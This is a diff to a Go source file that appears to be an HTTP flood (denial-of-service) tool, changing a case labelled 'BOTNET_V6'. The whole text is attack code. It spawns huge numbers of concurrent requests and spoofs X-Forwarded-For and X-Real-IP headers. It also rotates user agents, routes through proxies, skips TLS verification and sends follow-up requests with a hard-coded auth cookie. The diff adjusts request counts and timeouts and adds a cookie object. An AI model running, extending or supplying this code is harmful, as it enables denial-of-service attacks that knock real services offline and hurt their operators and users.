@@ -1515,96 +1515,103 @@ for i := 0; i < max_requests_global*16000; i++ {
 	}
 	case "BOTNET_V6":
     data := []byte(`{"foo":"bar"}`)
-    contentLength := len(data)
-    chunkSize := 16384
-    for i := 0; i < max_requests_global*200000; i++ {
-        wg.Add(1)
-        go func(i int) {
-            defer wg.Done()
-            key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
-            mutex.Lock()
-            cache[key]++
-            mutex.Unlock()
-            r, _ := http.NewRequest("SLOWER_POST_HEAD", urlString, nil)
-            if proxies != "" {
-                proxyURL, err := url.ParseRequestURI(proxies)
-                if err != nil {
-                    log.Fatalln(err)
-                }
-                transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
-                client.Transport = transport
+
+cookie := &http.Cookie{
+    Name:     "auth",
+    Value:    "SECURE_COOKIE_FOO",
+    HttpOnly: true,
+}
+
+contentLength := len(data)
+chunkSize := 16384
+for i := 0; i < max_requests_global*20000; i++ {
+    wg.Add(1)
+    go func(i int) {
+        defer wg.Done()
+        key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
+        mutex.Lock()
+        cache[key]++
+        mutex.Unlock()
+        r, _ := http.NewRequest("SLOWER_POST_HEAD", urlString, nil)
+        if proxies != "" {
+            proxyURL, err := url.ParseRequestURI(proxies)
+            if err != nil {
+                log.Fatalln(err)
             }
+            transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
+            client.Transport = transport
+        }
+        if i%2 == 0 {
+            r.Header.Add("X-Forwarded-For", "10.0.0.1")
+            r.Header.Add("X-Forwarded-Host", "1.1.1.1")
+            r.Header.Add("X-Forwarded-Proto", "http")
+            r.Header.Add("X-Real-IP", "10.0.1.1")
+        } else {
+            r.Header.Add("X-Forwarded-For", "9.0.0.76")
+            r.Header.Add("X-Forwarded-Host", "9.9.9.9")
+            r.Header.Add("X-Forwarded-Proto", "https")
+            r.Header.Add("X-Real-IP", "9.99.10")
+        }
+        rand.Seed(time.Now().UnixNano())
+        r.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+        r.URL.Scheme = "https"
+        chunkSize = rand.Intn(8-4+1)*1024 + 16384
+        for j := 0; j < contentLength; j += chunkSize {
+            end := j + chunkSize
+            if end > contentLength {
+                end = contentLength
+            }
+            chunk := data[j:end]
             if i%2 == 0 {
-                r.Header.Add("X-Forwarded-For", "10.0.0.1")
-                r.Header.Add("X-Forwarded-Host", "1.1.1.1")
-                r.Header.Add("X-Forwarded-Proto", "http")
-                r.Header.Add("X-Real-IP", "10.0.1.1")
+                buf := make([]byte, 1024)
+                r.Body = ioutil.NopCloser(bytes.NewReader(buf))
             } else {
-                r.Header.Add("X-Forwarded-For", "9.0.0.76")
-                r.Header.Add("X-Forwarded-Host", "9.9.9.9")
-                r.Header.Add("X-Forwarded-Proto", "https")
-                r.Header.Add("X-Real-IP", "9.99.10")
+                r.Body = ioutil.NopCloser(bytes.NewReader(chunk))
+                r.ContentLength = int64(len(chunk))
             }
-            rand.Seed(time.Now().UnixNano())
-            r.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
-            r.URL.Scheme = "https"
-            chunkSize = rand.Intn(8-4+1)*1024 + 16384
-            for j := 0; j < contentLength; j += chunkSize {
-                end := j + chunkSize
-                if end > contentLength {
-                    end = contentLength
-                }
-                chunk := data[j:end]
-                if i%2 == 0 {
-                    buf := make([]byte, 1024)
-                    r.Body = ioutil.NopCloser(bytes.NewReader(buf))
-                } else {
-                    r.Body = ioutil.NopCloser(bytes.NewReader(chunk))
-                    r.ContentLength = int64(len(chunk))
-                }
-                bot := &http.Client{
-                    Timeout: time.Second * 600,
-                    Transport: &http.Transport{
-                        MaxIdleConns:        5000,
-                        MaxIdleConnsPerHost: 5000,
-                        IdleConnTimeout:     6000 * time.Second,
-                        TLSClientConfig: &tls.Config{
-                            InsecureSkipVerify: true,
-                            MaxVersion:         tls.VersionTLS12,
-                            MinVersion:         tls.VersionTLS10,
-                        },
+            bot := &http.Client{
+                Timeout: time.Second * 60,
+                Transport: &http.Transport{
+                    MaxIdleConns:        500,
+                    MaxIdleConnsPerHost: 500,
+                    IdleConnTimeout:     600 * time.Second,
+                    TLSClientConfig: &tls.Config{
+                        InsecureSkipVerify: true,
+                        MaxVersion:         tls.VersionTLS12,
+                        MinVersion:         tls.VersionTLS10,
                     },
-                }
-                r.Header.Set("X-Protocol-Level", "2")
-                start := time.Now()
-                resp, err := bot.Do(r)
-                if err != nil {
-                    log.Printf("Error: %v", err)
-                } else {
-                    defer resp.Body.Close()
-                    if resp.StatusCode == http.StatusOK {
-                        req, err := http.NewRequest(method, urlString, nil)
-                        if err != nil {
-                            log.Printf("Error: %v", err)
+                },
+            }
+            r.Header.Set("X-Protocol-Level", "2")
+            start := time.Now()
+            resp, err := bot.Do(r)
+            if err != nil {
+                log.Printf("Error: %v", err)
+            } else {
+                defer resp.Body.Close()
+                if resp.StatusCode == http.StatusOK {
+                    req, err := http.NewRequest(method, urlString, nil)
+                    if err != nil {
+                        log.Printf("Error: %v", err)
+                    } else {
+                        req.Header.Set("Content-Type", "application/json")
+                        if i%2 == 0 {
+                            req.Header.Set("X-Forwarded-For", "10.0.0.1")
                         } else {
-                            req.Header.Set("Content-Type", "application/json")
-                            if i%2 == 0 {
-                                req.Header.Set("X-Forwarded-For", "10.0.0.1")
-                            } else {
-                                req.Header.Set("X-Forwarded-For", "9.0.0.1")
-                            }
-                            req.Header.Set("Cookie", "auth=SECURE_COOKIE_FOO") // added line to set up cookie
-                            req.Header.Set("X-Protocol-Level", "3")
-                            req.Header.Set("HTTPS-SYN", "true") // added line for HTTPS-SYN
-                            bot.Do(req)
+                            req.Header.Set("X-Forwarded-For", "9.0.0.1")
                         }
-                        elapsed := time.Since(start)
-                        fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
+                        req.AddCookie(cookie) // added line to add cookie to request headers
+                        req.Header.Set("X-Protocol-Level", "3")
+                        req.Header.Set("HTTPS-SYN", "true") // added line for HTTPS-SYN
+                        bot.Do(req)
                     }
+                    elapsed := time.Since(start)
+                    fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
                 }
             }
-        }(i)
-    }
+        }
+    }(i)
+}
 	default:
 		log.Fatalln("Invalid HTTP method")
 	}
